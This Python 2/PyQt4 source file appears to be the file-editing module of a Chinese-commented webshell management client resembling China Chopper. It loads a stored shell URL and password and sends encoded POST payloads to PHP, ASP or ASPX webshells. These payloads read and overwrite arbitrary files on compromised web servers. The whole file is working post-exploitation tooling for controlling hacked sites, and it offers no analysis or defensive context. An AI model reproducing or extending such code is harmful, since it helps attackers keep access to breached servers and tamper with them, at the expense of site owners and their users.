#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
#文件编辑
from PyQt4 import uic
from PyQt4 import QtCore, QtGui ,QtNetwork
from PyQt4.QtCore import pyqtSlot
from PyQt4.QtCore import *
from ctypes import *
from PyQt4.QtGui import *
import socket
socket.setdefaulttimeout(10)

import sys
reload(sys)
sys.setdefaultencoding("utf-8")

try:
    _fromUtf8 = QtCore.QString.fromUtf8
except AttributeError:
    _fromUtf8 = lambda s: s

from Ui_View import ui #UI窗口
from Db_Model import db_shell #常用数据库操作
from Clicked_Controller import link_shell  #链接SHELL等操作
from Clicked_Controller import eval_link  #链接SHELL
from Clicked_Controller import msg #消息提示
from Clicked_Controller import g #公共文件
from Clicked_Controller import log #日志记录

import base64
import urllib
import binascii

class Edit_file(QWidget):
    def __init__(self,**kwargs):
        super(Edit_file, self).__init__()
        self.main_ui=ui.UIManager.get_ui('main_ui') #主程序UI
        # self.shell_sql=UIManager.shell_sql
        self.ShowFile_ui = uic.loadUi("ui/Edit_file.ui", self)#动态加标签
        self.main_ui.tabWidget.addTab(self.ShowFile_ui,QIcon('system/file_Edit.ico'),u"%s"%(g.path_name(u'%s'%(kwargs['name']))))
        self.main_ui.tabWidget.setCurrentIndex(self.main_ui.tabWidget.count()-1)#显示当前页
        #self.data_textEdit.setAcceptRichText(True)  #设置成纯文本
        try:
            if "data" in kwargs:  #内容
                #self.plainTextEdit.setText(u'%s'%(kwargs['data']))
                self.data_textEdit.setPlainText(u'%s'%(kwargs['data']))
            if "name" in kwargs:  #文件路径
                self.name_lineEdit.setText(u'%s'%(kwargs['name']))

            self.id_shell_list=db_shell.id_sitetable_shell('%s'%(kwargs['ID']))  #通过ID查询SHELL的状态
            self.id=str(self.id_shell_list[0])         #自动编号
            #self.type_id=str(self.id_shell_list[1])    #      类别
            self.siteurl=str(self.id_shell_list[2])    #    网址
            self.sitepass=str(self.id_shell_list[3])   #    密码
            #self.link=str(self.id_shell_list[4])         #链接状态
            #self.ip=str(self.id_shell_list[5])         #    ip地址
            #self.config=str(self.id_shell_list[6])     #    配置
            #self.coding=str(self.id_shell_list[7])     #  编码方式
            self.script=str(self.id_shell_list[8])      #   asp   php
            ###########################################
            #事件响应
            self.load_Button.clicked.connect(self.load_shell)  #载入路径
            self.save_Button.clicked.connect(self.save_shell)  #保存文件
            ###########################################
        except BaseException, e:
            log.logging.debug("except:%s"%(str(e)))

    def load_shell(self):  #载入路径
        try:
            name=self.name_lineEdit.text()
            if self.script=="PHP":
                psot_data=link_shell.GetPostText(self.script,"Open_file")    #上传文件
                psot_data="%s&z1=%s"% \
                          (link_shell.post_php_data(psot_data),base64.b64encode(str(name)))
            if self.script=="ASP":
                psot_data=link_shell.GetPostText(self.script,"Open_file")    #获取文件内容
                psot_data="%s&z1=%s"% \
                          (psot_data,urllib.quote(str(name)))
            if self.script=="ASPX":
                psot_data=link_shell.GetPostText(self.script,"Open_file")    #获取代码
                psot_data="%s&z1=%s"% \
                          (psot_data,urllib.quote(base64.b64encode(str(name).replace('\\', '\\\\'))))
            FALSE_bool,ResInfo=eval_link.Post_eval_php(str(self.id),psot_data) #获取 请求内容
            if not FALSE_bool==0:
                # if "ERROR:" in ResInfo:
                #     msg.msg_lower_Left(u"%s错误 %s"%(str(name),str(ResInfo)))#设置状态栏文字信息
                #     msg.msg_box(u"错误提示",str(ResInfo))  #错误提示
                # else:
                msg.msg_lower_Left(u"%s读取文件完成"%(str(name)))#设置状态栏文字信息
                self.data_textEdit.setPlainText(u'%s'%(ResInfo))
                #Edit_file_ui.Edit_file(id=self.id,data=ResInfo,name=name)  #编辑这个文件
            else:
                msg.msg_lower_Left(u"%s读取文件错误"%(str(name)))#设置状态栏文字信息
        except BaseException, e:
            log.logging.debug("except:%s"%(str(e)))


    def save_shell(self):  #保存文件
        try:
            name=self.name_lineEdit.text()
            file_dataX=self.data_textEdit.toPlainText()
            file_data=base64.b64encode(str(file_dataX))
            #name3=name.replace("\\","\\\\") #Route_File
            name2=g.file_GetExt(str(name))#输入路径地址  转换路径
            if self.script=="PHP":
                psot_data=link_shell.GetPostText(self.script,"Route_File")    #保存文件
                psot_data="%s&z1=%s&z2=%s"% \
                          (link_shell.post_php_data(psot_data),base64.b64encode(str(name2)),urllib.quote(str(file_data)))
            if self.script=="ASP":
                psot_data=link_shell.GetPostText(self.script,"Route_File")    #保存文件
                psot_data="%s&z1=%s&z2=%s"% \
                          (psot_data,binascii.b2a_hex(str(name2)),binascii.b2a_hex(str(file_dataX)))
            if self.script=="ASPX":
                psot_data=link_shell.GetPostText(self.script,"Route_File")    #保存文件
                psot_data="%s&z1=%s&z2=%s"% \
                          (psot_data,urllib.quote(base64.b64encode(str(name2).replace('\\', '\\\\'))),urllib.quote(str(file_dataX)))
            FALSE_bool,ResInfo=eval_link.Post_eval_php(str(self.id),psot_data) #获取 请求内容
            if not ((FALSE_bool==0) and (str(ResInfo)=="1")):
                if "ERROR:" in ResInfo:
                    msg.msg_lower_Left(u"%s错误 %s"%(str(name2),str(ResInfo)))#设置状态栏文字信息
                    msg.msg_box(u"错误提示",str(ResInfo))  #错误提示
                else:
                    msg.msg_lower_Left(u"%s文件写入完成"%(str(name2)))#设置状态栏文字信息
                #self.data_textEdit.setPlainText(u'%s'%(ResInfo))
                #Edit_file_ui.Edit_file(id=self.id,data=ResInfo,name=name)  #编辑这个文件
            else:
                msg.msg_lower_Left(u"%s文件写入错误"%(str(name2)))#设置状态栏文字信息
        except BaseException, e:
            log.logging.debug("except:%s"%(str(e)))

